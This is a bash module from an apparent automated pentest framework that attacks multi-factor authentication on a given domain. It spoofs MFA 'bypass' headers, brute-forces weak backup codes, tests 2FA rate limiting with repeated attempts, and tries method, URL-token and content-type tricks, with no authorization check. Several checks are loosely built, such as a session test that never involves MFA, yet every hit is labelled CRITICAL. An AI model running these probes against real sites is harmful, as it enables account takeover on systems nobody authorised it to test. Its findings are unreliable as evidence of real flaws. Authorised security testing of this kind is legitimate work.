#!/usr/bin/env bash
# mfa_bypass_phase.sh - MFA bypass methodology module, backup code abuse,
# 2FA brute force, session persistence after MFA.

mfa_bypass_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "mfa_bypass_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/mfa_bypass"

    local results=0
    local vulns_file="$output_dir/mfa_bypass/mfa_bypass_vulns.txt"
    local flows_file="$output_dir/mfa_bypass/mfa_flows.txt"

    log "INFO" "Starting MFA bypass analysis for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # Discover MFA-related endpoints
    local mfa_endpoints=(
        "/api/mfa/verify"
        "/api/mfa/setup"
        "/api/2fa/verify"
        "/api/2fa/setup"
        "/api/totp/verify"
        "/api/auth/mfa"
        "/api/auth/2fa"
        "/api/auth/totp"
        "/api/auth/backup-codes"
        "/api/auth/sms"
        "/api/auth/email-code"
        "/api/verify"
        "/api/mfa"
        "/mfa/verify"
        "/2fa/verify"
        "/auth/mfa"
        "/auth/2fa"
    )

    # Backup code related endpoints
    local backup_endpoints=(
        "/api/mfa/backup-codes"
        "/api/backup-codes"
        "/api/2fa/backup"
        "/api/auth/backup"
        "/api/mfa/codes"
        "/api/backup"
    )

    # Discover active MFA endpoints
    local active_mfa_endpoints=()
    for ep in "${mfa_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")
        if [[ "$status" != "404" && "$status" != "000" ]]; then
            echo "[MFA-ENDPOINT] $url - HTTP $status" >> "$flows_file"
            active_mfa_endpoints+=("$url")
            ((results++)) || true
        fi
    done

    # Discover backup code endpoints
    local active_backup_endpoints=()
    for ep in "${backup_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")
        if [[ "$status" != "404" && "$status" != "000" ]]; then
            echo "[BACKUP-ENDPOINT] $url - HTTP $status" >> "$flows_file"
            active_backup_endpoints+=("$url")
            ((results++)) || true
        fi
    done

    # Test 1: MFA bypass via direct API access
    log "INFO" "Testing MFA bypass via direct API access"

    local protected_endpoints=(
        "/api/users"
        "/api/profile"
        "/api/settings"
        "/api/dashboard"
        "/api/data"
        "/api/account"
        "/api/admin"
    )

    for pep in "${protected_endpoints[@]}"; do
        local url="https://${domain}${pep}"

        # Try accessing without MFA token
        local no_mfa_status
        no_mfa_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")

        # Try with empty MFA header
        local empty_mfa_status
        empty_mfa_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
            -H "X-MFA-Token: " \
            -H "X-2FA-Token: " \
            "$url" 2>/dev/null || echo "000")

        # Try with bypass headers
        local bypass_headers=(
            "X-MFA-Bypass: true"
            "X-2FA-Bypass: true"
            "X-MFA-Verified: true"
            "X-2FA-Verified: true"
            "X-MFA-Complete: true"
            "X-Auth-Level: full"
            "X-Verification: bypass"
        )

        for bh in "${bypass_headers[@]}"; do
            local bh_status
            bh_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -H "$bh" "$url" 2>/dev/null || echo "000")
            if [[ "$bh_status" == "200" ]]; then
                echo "[MFA-BYPASS-HEADER] $pep - Bypass via $bh" >> "$vulns_file"
                ((results++)) || true
            fi
        done
    done

    # Test 2: Backup code brute force
    log "INFO" "Testing backup code brute force"

    for backup_ep in "${active_backup_endpoints[@]}"; do
        # Common backup code patterns (6-digit, 8-digit, alphanumeric)
        local backup_patterns=(
            "000000"
            "123456"
            "111111"
            "000001"
            "12345678"
            "ABCDEFGH"
            "00000000"
            "1234567890"
        )

        for code in "${backup_patterns[@]}"; do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -X POST -d "code=$code" \
                "$backup_ep" 2>/dev/null || echo "000")

            if [[ "$status" == "200" || "$status" == "201" ]]; then
                echo "[BACKUP-CODE-WEAK] $backup_ep - Accepted weak backup code: $code (HTTP $status)" >> "$vulns_file"
                ((results++)) || true
            fi
        done

        # Check for backup code enumeration
        local valid_status
        valid_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
            -X POST -d "code=validcode" \
            "$backup_ep" 2>/dev/null || echo "000")
        local invalid_status
        invalid_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
            -X POST -d "code=invalidcode" \
            "$backup_ep" 2>/dev/null || echo "000")

        if [[ "$valid_status" != "$invalid_status" ]]; then
            echo "[BACKUP-ENUM] $backup_ep - Different response for valid vs invalid code" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Test 3: TOTP/2FA code brute force
    log "INFO" "Testing 2FA code brute force"

    for mfa_ep in "${active_mfa_endpoints[@]}"; do
        # Check if there's rate limiting on 2FA verification
        local rl_count=0
        for i in $(seq 1 10); do
            local rl_status
            rl_status=$(curl -s -o /dev/null -w "%{http_code}" -m 5 \
                -X POST -d "code=000000&token=test" \
                "$mfa_ep" 2>/dev/null || echo "000")
            if [[ "$rl_status" == "200" || "$rl_status" == "201" || "$rl_status" == "400" || "$rl_status" == "401" ]]; then
                ((rl_count++)) || true
            fi
        done

        if [[ "$rl_count" -ge 10 ]]; then
            echo "[NO-RL-2FA] $mfa_ep - No rate limiting: $rl_count/10 verification attempts allowed" >> "$vulns_file"
            ((results++)) || true
        fi

        # Check response differentiation for valid vs invalid codes
        local valid_resp
        valid_resp=$(curl -s -m 10 -X POST -d "code=000000&token=test" "$mfa_ep" 2>/dev/null | head -c 200 || true)
        local invalid_resp
        invalid_resp=$(curl -s -m 10 -X POST -d "code=999999&token=test" "$mfa_ep" 2>/dev/null | head -c 200 || true)

        if [[ -n "$valid_resp" && -n "$invalid_resp" && "$valid_resp" != "$invalid_resp" ]]; then
            echo "[2FA-ENUM] $mfa_ep - Different responses for different codes" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Test 4: Session persistence after MFA
    log "INFO" "Testing session persistence after MFA"

    local session_endpoints=(
        "/api/session"
        "/api/auth/session"
        "/api/me"
        "/api/user"
        "/api/profile"
    )

    for sep in "${session_endpoints[@]}"; do
        local url="https://${domain}${sep}"

        # Get a session
        local cookie_jar
        cookie_jar=$(mktemp)
        curl -s -c "$cookie_jar" -m 10 "$url" 2>/dev/null || true

        # Check session without MFA token
        local session_status
        session_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
            -b "$cookie_jar" "$url" 2>/dev/null || echo "000")

        if [[ "$session_status" == "200" ]]; then
            # Check if session persists after time
            sleep 2
            local persist_status
            persist_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -b "$cookie_jar" "$url" 2>/dev/null || echo "000")

            if [[ "$persist_status" == "200" ]]; then
                echo "[SESSION-PERSIST] $sep - Session persists after MFA window" >> "$vulns_file"
                ((results++)) || true
            fi
        fi

        rm -f "$cookie_jar" 2>/dev/null || true
    done

    # Test 5: MFA bypass via method manipulation
    log "INFO" "Testing MFA bypass via HTTP method"

    for mfa_ep in "${active_mfa_endpoints[@]}"; do
        for method in "GET" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD"; do
            local m_status
            m_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -X "$method" "$mfa_ep" 2>/dev/null || echo "000")

            if [[ "$m_status" == "200" || "$m_status" == "201" ]]; then
                echo "[MFA-METHOD-BYPASS] $method $mfa_ep - MFA check bypassed via method (HTTP $m_status)" >> "$vulns_file"
                ((results++)) || true
            fi
        done
    done

    # Test 6: MFA token in URL/query parameter
    log "INFO" "Testing MFA token in URL"

    for mfa_ep in "${active_mfa_endpoints[@]}"; do
        local base_domain
        base_domain=$(echo "$mfa_ep" | sed 's|/api/.*||' || echo "https://$domain")

        local url_with_token="${mfa_ep}?mfa_token=123456"
        local url_status
        url_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url_with_token" 2>/dev/null || echo "000")

        if [[ "$url_status" == "200" ]]; then
            echo "[MFA-IN-URL] $mfa_ep - MFA token accepted in URL query parameter" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Test 7: MFA bypass via content-type manipulation
    log "INFO" "Testing MFA bypass via content-type"

    for mfa_ep in "${active_mfa_endpoints[@]}"; do
        local content_types=(
            "application/x-www-form-urlencoded"
            "application/json"
            "multipart/form-data"
            "text/plain"
            "application/xml"
        )

        local first_status=""
        local status_mismatch=false

        for ct in "${content_types[@]}"; do
            local ct_status
            ct_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 \
                -X POST -H "Content-Type: $ct" \
                -d "code=000000" \
                "$mfa_ep" 2>/dev/null || echo "000")

            if [[ -z "$first_status" ]]; then
                first_status="$ct_status"
            elif [[ "$ct_status" != "$first_status" && "$ct_status" != "000" ]]; then
                status_mismatch=true
            fi
        done

        if $status_mismatch; then
            echo "[MFA-CONTENT-TYPE] $mfa_ep - Different status codes based on Content-Type" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Write count
    echo "$results" > "$output_dir/mfa_bypass/count.txt"

    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "mfa_bypass" "CRITICAL" "$line" 2>/dev/null || true
        done < "$vulns_file" 2>/dev/null || true
    fi

    py_log "INFO" "mfa_bypass_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "MFA bypass phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    mfa_bypass_phase "$@"
fi
